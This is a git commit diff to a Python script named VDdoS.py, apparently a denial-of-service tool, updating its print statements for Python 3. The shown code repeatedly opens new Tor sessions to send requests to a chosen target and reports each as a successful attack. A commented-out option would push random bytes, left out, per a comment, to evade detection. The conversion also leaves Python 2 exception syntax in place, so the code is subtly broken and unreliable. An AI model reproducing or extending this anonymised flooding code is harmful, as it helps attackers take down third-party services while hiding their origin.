643e2f1009e7d59ed78fe0b41a3d8b857d2dc68e
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-17 10:02:59 +0300

    Update VDdoS.py

--- VDdoS.py
+++ VDdoS.py
@@ -31,7 +31,7 @@ def main():
         while counter < max_attempts:
             tor = Tor()
             if not tor.tor_installed():
-                print u'{}[!]{} Tor is not installed. Exiting...'.format(color.RED, color.END)
+                print( u'{}[!]{} Tor is not installed. Exiting...'.format(color.RED, color.END))
                 sys.exit(1)
             else:
                 # Initial timestamp and increment the counter
@@ -40,31 +40,31 @@ def main():
 
                 # Init a new Tor session
                 session = tor.new_session()
-                print u'{}[!]{} New Tor session initialized...'.format(color.BLUE, color.END)
-                print u'\n{}[+]{} Target: {}{}{}'.format(color.PURPLE, color.END, color.PURPLE, target, color.END)
+                print( u'{}[!]{} New Tor session initialized...'.format(color.BLUE, color.END))
+                print( u'\n{}[+]{} Target: {}{}{}'.format(color.PURPLE, color.END, color.PURPLE, target, color.END))
 
                 # Getting data from the server
-                print u'{}[*]{} Getting data from {}...'.format(color.ORANGE, color.END, target)
+                print( u'{}[*]{} Getting data from {}...'.format(color.ORANGE, color.END, target))
                 session.get(target)
                 # Putting data (omitted, maybe it makes detection easier)
                 # random_bytes = random._urandom(1490)
-                # print u'{}[*]{} Putting data on {}...'.format(color.ORANGE, color.END, target)
+                # print( u'{}[*]{} Putting data on {}...'.format(color.ORANGE, color.END, target))
                 # session.put(target, random_bytes)
-                print u'{}[*]{} Target {} was attacked succesfully'.format(color.ORANGE, color.END, target)
+                print( u'{}[*]{} Target {} was attacked succesfully'.format(color.ORANGE, color.END, target))
 
     except KeyboardInterrupt: pass
     except Exception,exception:
-        print u'\n{}[!]{} An error has occurred:'.format(color.RED, color.END)
-        print u'{}{}{}'.format(color.RED, exception, Exception, color.END)
+        print( u'\n{}[!]{} An error has occurred:'.format(color.RED, color.END))
+        print( u'{}{}{}'.format(color.RED, exception, Exception, color.END))
 
     finally:
         end_time = datetime.datetime.now().time().strftime('%H:%M:%S')
         total_time = (datetime.datetime.strptime(end_time, '%H:%M:%S') - datetime.datetime.strptime(start_time, '%H:%M:%S'))
-        print u'{}[+]{} Time elapsed:\t{}'.format(color.GREEN, color.END, total_time)
-        print u'{}[+]{} Number of requests:\t{}'.format(color.GREEN, color.END, counter)
-        print u'{}[!]{} Stopping Tor...'.format(color.RED, color.END)
+        print( u'{}[+]{} Time elapsed:\t{}'.format(color.GREEN, color.END, total_time))
+        print( u'{}[+]{} Number of requests:\t{}'.format(color.GREEN, color.END, counter))
+        print( u'{}[!]{} Stopping Tor...'.format(color.RED, color.END))
         tor.stop_tor()
-        print u'{}[!]{} Exiting...\n'.format(color.RED, color.END)
+        print( u'{}[!]{} Exiting...\n'.format(color.RED, color.END))
         sys.exit(0)
 
 
